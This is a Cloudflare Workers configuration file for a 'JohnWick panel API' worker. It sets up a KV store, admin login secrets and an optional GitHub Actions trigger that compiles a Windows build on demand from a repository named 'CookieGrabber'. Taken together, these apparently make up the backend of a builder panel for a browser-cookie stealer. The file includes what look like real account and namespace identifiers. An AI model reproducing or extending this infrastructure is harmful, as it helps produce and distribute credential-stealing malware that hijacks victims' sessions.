# wrangler.toml for the JohnWick panel API worker.
# After `wrangler kv namespace create PANEL_KV`, paste the generated id below.

name = "jwg-panel-api"
main = "src/index.js"
compatibility_date = "2024-11-01"

# Bind a KV namespace named PANEL_KV (the code reads env.PANEL_KV).
[[kv_namespaces]]
binding = "PANEL_KV"
id = "6023d38003674924a4980f9467e4c423"

# Secrets are set with `wrangler secret put NAME` -- NEVER write real values here.
#   SESSION_SECRET : long random string, signs session tokens
#   ADMIN_USER     : first admin username (default "admin")
#   ADMIN_PASS     : first admin password (bootstraps only when no users exist)
#   ALLOWED_ORIGIN : exact https origin of your Netlify site, e.g. https://you.netlify.app
# Optional -- enable auto-triggering the free GitHub Actions Windows builder so a
# user's "Build" click compiles with NO manual step and NO machine of yours:
#   GH_OWNER / GH_REPO       : your GitHub repo owner + name
#   GH_WORKFLOW_ID           : "build.yml" (the workflow filename)
#   GH_PAT                   : fine-grained PAT scoped to that repo, Actions:write
# vars are non-secret defaults; secrets override via `wrangler secret put`.
[vars]
ADMIN_USER = "admin"
GH_OWNER = "johnnybaba14"
GH_REPO = "CookieGrabber"
GH_WORKFLOW_ID = "build.yml"

# tirbeo demo CF account
account_id = "62052cdfd3072a927755e73cfc45742a"
